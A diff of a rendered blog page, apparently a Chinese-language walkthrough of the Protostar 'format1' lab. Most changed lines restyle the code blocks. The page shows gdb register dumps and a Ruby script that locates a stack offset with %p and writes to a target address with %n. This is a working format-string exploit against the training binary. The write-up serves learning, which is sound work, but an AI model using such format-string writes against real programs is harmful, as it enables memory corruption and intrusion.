-</span></span><span class="line"><span class="cl">Starting program: /opt/protostar/bin/format1 ABCD1234ABCD
-</span></span><span class="line"><span class="cl">Breakpoint 1, 0x08048430 in main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>2, <span class="nv">argv</span><span class="o">=</span>0xbffff834<span class="o">)</span> at format1/format1.c:19
-</span></span><span class="line"><span class="cl">19	in format1/format1.c
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> info registers 
-</span></span><span class="line"><span class="cl">eax            0xbffff97a	-1073743494
-</span></span><span class="line"><span class="cl">ecx            0xadac7a9d	-1381205347
-</span></span><span class="line"><span class="cl">edx            0x2	<span class="m">2</span>
-</span></span><span class="line"><span class="cl">ebx            0xb7fd7ff4	-1208123404
-</span></span><span class="line"><span class="cl">esp            0xbffff770	0xbffff770
-</span></span><span class="line"><span class="cl">ebp            0xbffff788	0xbffff788
-</span></span><span class="line"><span class="cl">esi            0x0	<span class="m">0</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r ABCD1234AB
+</span></span><span style="display:flex;"><span>Starting program: /opt/protostar/bin/format1 ABCD1234AB
+</span></span><span style="display:flex;"><span>Breakpoint 1, 0x08048430 in main <span style="color:#f92672">(</span>argc<span style="color:#f92672">=</span>2, argv<span style="color:#f92672">=</span>0xbffff844<span style="color:#f92672">)</span> at format1/format1.c:19
+</span></span><span style="display:flex;"><span>19	in format1/format1.c
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers 
+</span></span><span style="display:flex;"><span>eax            0xbffff97c	-1073743492
+</span></span><span style="display:flex;"><span>ecx            0xad015181	-1392422527
+</span></span><span style="display:flex;"><span>edx            0x2	<span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>ebx            0xb7fd7ff4	-1208123404
+</span></span><span style="display:flex;"><span>esp            0xbffff780	0xbffff780
+</span></span><span style="display:flex;"><span>ebp            0xbffff798	0xbffff798
+</span></span><span style="display:flex;"><span>esi            0x0	<span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r ABCD1234ABC
+</span></span><span style="display:flex;"><span>The program being debugged has been started already.
+</span></span><span style="display:flex;"><span>Start it from the beginning? <span style="color:#f92672">(</span>y or n<span style="color:#f92672">)</span> y
+</span></span><span style="display:flex;"><span>Starting program: /opt/protostar/bin/format1 ABCD1234ABC
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Breakpoint 1, 0x08048430 in main <span style="color:#f92672">(</span>argc<span style="color:#f92672">=</span>2, argv<span style="color:#f92672">=</span>0xbffff844<span style="color:#f92672">)</span> at format1/format1.c:19
+</span></span><span style="display:flex;"><span>19	in format1/format1.c
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers 
+</span></span><span style="display:flex;"><span>eax            0xbffff97b	-1073743493
+</span></span><span style="display:flex;"><span>ecx            0x912d21cc	-1859313204
+</span></span><span style="display:flex;"><span>edx            0x2	<span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>ebx            0xb7fd7ff4	-1208123404
+</span></span><span style="display:flex;"><span>esp            0xbffff780	0xbffff780
+</span></span><span style="display:flex;"><span>ebp            0xbffff798	0xbffff798
+</span></span><span style="display:flex;"><span>esi            0x0	<span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r ABCD1234ABCD
+</span></span><span style="display:flex;"><span>Starting program: /opt/protostar/bin/format1 ABCD1234ABCD
+</span></span><span style="display:flex;"><span>Breakpoint 1, 0x08048430 in main <span style="color:#f92672">(</span>argc<span style="color:#f92672">=</span>2, argv<span style="color:#f92672">=</span>0xbffff834<span style="color:#f92672">)</span> at format1/format1.c:19
+</span></span><span style="display:flex;"><span>19	in format1/format1.c
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers 
+</span></span><span style="display:flex;"><span>eax            0xbffff97a	-1073743494
+</span></span><span style="display:flex;"><span>ecx            0xadac7a9d	-1381205347
+</span></span><span style="display:flex;"><span>edx            0x2	<span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>ebx            0xb7fd7ff4	-1208123404
+</span></span><span style="display:flex;"><span>esp            0xbffff770	0xbffff770
+</span></span><span style="display:flex;"><span>ebp            0xbffff788	0xbffff788
+</span></span><span style="display:flex;"><span>esi            0x0	<span style="color:#ae81ff">0</span>
 </span></span></code></pre></div><p>可以看到，从 <code>ABCD1234AB</code> 到 <code>ABCD1234ABC</code> 时，EAX 确实减小了一，但 EBP 的值没变</p>
 <p>从 <code>ABCD1234ABC</code> 到 <code>ABCD1234ABCD</code> 时，EAX 确实减小了一，</p>
 <p>但 EBP&hellip;从 <code>0xbffff798</code> 到 <code>0xbffff788</code>，减小了 16&hellip;</p>
@@ -700,51 +707,51 @@ if (!doNotTrack) {
 <li>把面包屑 <code>breadcrumb</code> 替换成要写的地址，打印同样多的 <code>%p</code> 但把第三步中记录的 <code>%p</code> 换成 <code>%n</code></li>
 <li>结束</li>
 </ol>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/ruby</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># convert ASCII to Hex in Little Endian</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># str: String</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># return: String</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">to_hex</span><span class="p">(</span><span class="n">str</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># convert to 32 bit integers in small endian</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># the tmp is Array</span>
-</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">str</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;N*&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># encode these integers with big endian</span>
-</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;V*&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># encode the result in hexadecimal</span>
-</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="c1"># convert Array to String</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">tmp</span> <span class="o">*</span> <span class="s2">&#34;&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="k">end</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># address of target: 0x08049638</span>
-</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x38\x96\x04\x08</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">breadcrumb</span> <span class="o">=</span> <span class="s2">&#34;ABCD&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">times</span> <span class="o">=</span> <span class="mi">1</span>
-</span></span><span class="line"><span class="cl"><span class="n">maximum</span> <span class="o">=</span> <span class="mi">200</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">times</span> <span class="o">&lt;=</span> <span class="n">maximum</span>
-</span></span><span class="line"><span class="cl">	<span class="n">command</span> <span class="o">=</span> <span class="s">&lt;&lt;-END
-</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="sr">/opt/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">format1</span> <span class="s2">&#34;</span><span class="si">#{</span><span class="n">breadcrumb</span><span class="si">}</span><span class="s2"> </span><span class="si">#{</span><span class="s2">&#34;%p &#34;</span> <span class="o">*</span> <span class="n">times</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">	<span class="k">END</span>
-</span></span><span class="line"><span class="cl">	<span class="n">result</span> <span class="o">=</span> <span class="sb">`</span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="sb">`</span>
-</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">include?</span> <span class="n">to_hex</span><span class="p">(</span><span class="n">breadcrumb</span><span class="p">)</span> <span class="k">then</span> <span class="k">break</span> <span class="k">end</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">times</span> <span class="o">==</span> <span class="n">maximum</span> <span class="k">then</span> <span class="nb">abort</span><span class="p">(</span><span class="s2">&#34;err&#34;</span><span class="p">)</span> <span class="k">end</span>
-</span></span><span class="line"><span class="cl">	<span class="n">times</span> <span class="o">+=</span> <span class="mi">1</span>
-</span></span><span class="line"><span class="cl"><span class="k">end</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">result</span>
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;&gt; %p appeared </span><span class="si">#{</span><span class="n">times</span><span class="si">}</span><span class="s2"> times&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">breadcrumb_index</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">split</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="n">to_hex</span><span class="p">(</span><span class="n">breadcrumb</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;&gt; breadcrumb appeared in the </span><span class="si">#{</span><span class="n">breadcrumb_index</span><span class="si">}</span><span class="s2"> %p&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s">&lt;&lt;-END
-</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="sr">/opt/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">format1</span> <span class="s2">&#34;</span><span class="si">#{</span><span class="n">target</span><span class="si">}</span><span class="s2"> </span><span class="si">#{</span><span class="s2">&#34;%p &#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">breadcrumb_index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="si">}</span><span class="s2">%n </span><span class="si">#{</span><span class="s2">&#34;%p &#34;</span> <span class="o">*</span> <span class="p">(</span><span class="n">times</span> <span class="o">-</span> <span class="n">breadcrumb_index</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="k">END</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;&gt; exec: </span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="sb">`</span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="sb">`</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/ruby</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># convert ASCII to Hex in Little Endian</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># str: String</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># return: String</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_hex</span>(str)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># convert to 32 bit integers in small endian</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># the tmp is Array</span>
+</span></span><span style="display:flex;"><span>        tmp <span style="color:#f92672">=</span> str<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;N*&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># encode these integers with big endian</span>
+</span></span><span style="display:flex;"><span>        tmp <span style="color:#f92672">=</span> tmp<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;V*&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># encode the result in hexadecimal</span>
+</span></span><span style="display:flex;"><span>        tmp <span style="color:#f92672">=</span> tmp<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;H*&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># convert Array to String</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> tmp <span style="color:#f92672">*</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># address of target: 0x08049638</span>
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\x96\x04\x08</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>breadcrumb <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCD&#34;</span>
+</span></span><span style="display:flex;"><span>times <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>maximum <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> times <span style="color:#f92672">&lt;=</span> maximum
+</span></span><span style="display:flex;"><span>	command <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;&lt;-END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">/opt/</span>protostar<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>format1 <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span>breadcrumb<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">#{</span><span style="color:#e6db74">&#34;%p &#34;</span> <span style="color:#f92672">*</span> times<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">END</span>
+</span></span><span style="display:flex;"><span>	result <span style="color:#f92672">=</span> <span style="color:#e6db74">`</span><span style="color:#e6db74">#{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> result<span style="color:#f92672">.</span>include? to_hex(breadcrumb) <span style="color:#66d9ef">then</span> <span style="color:#66d9ef">break</span> <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> times <span style="color:#f92672">==</span> maximum <span style="color:#66d9ef">then</span> abort(<span style="color:#e6db74">&#34;err&#34;</span>) <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>	times <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts result
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">&#34;&gt; %p appeared </span><span style="color:#e6db74">#{</span>times<span style="color:#e6db74">}</span><span style="color:#e6db74"> times&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>breadcrumb_index <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>split<span style="color:#f92672">.</span>index(<span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> to_hex(breadcrumb))
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">&#34;&gt; breadcrumb appeared in the </span><span style="color:#e6db74">#{</span>breadcrumb_index<span style="color:#e6db74">}</span><span style="color:#e6db74"> %p&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>command <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;&lt;-END
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#e6db74">/opt/</span>protostar<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>format1 <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">#{</span><span style="color:#e6db74">&#34;%p &#34;</span> <span style="color:#f92672">*</span> (breadcrumb_index <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">%n </span><span style="color:#e6db74">#{</span><span style="color:#e6db74">&#34;%p &#34;</span> <span style="color:#f92672">*</span> (times <span style="color:#f92672">-</span> breadcrumb_index)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">END</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">&#34;&gt; exec: </span><span style="color:#e6db74">#{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">`</span><span style="color:#e6db74">#{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>
 </span></span></code></pre></div><p><img src="/p/protostar_format_1/end.png"
 	width="2874"
 	height="1162"
@@ -1108,7 +1115,7 @@ if (!doNotTrack) {
         
         <div class="widget--toc">
             <nav id="TableOfContents">
-  <ol>
+  <ul>
     <li><a href="#format-one">Format One</a></li>
     <li><a href="#argv1-p-breadcrumb">Argv[1], %p, Breadcrumb</a></li>
     <li><a href="#script-1">Script #1</a></li>
@@ -1117,7 +1124,7 @@ if (!doNotTrack) {
     <li><a href="#pwd-alignment-environment-variables">Pwd, Alignment, Environment Variables</a></li>
     <li><a href="#eax-ebp-buffer">EAX, EBP, Buffer</a></li>
     <li><a href="#script-2">Script #2</a></li>
-  </ol>
+  </ul>
 </nav>
         </div>
     </section>
